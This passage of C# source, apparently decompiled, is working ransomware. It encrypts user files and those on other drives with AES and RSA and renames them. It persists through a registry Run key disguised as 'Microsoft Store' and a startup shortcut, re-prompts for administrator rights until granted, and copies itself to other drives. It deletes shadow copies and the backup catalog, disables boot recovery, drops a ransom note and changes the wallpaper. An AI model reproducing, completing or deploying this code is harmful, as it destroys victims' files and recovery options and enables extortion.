		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
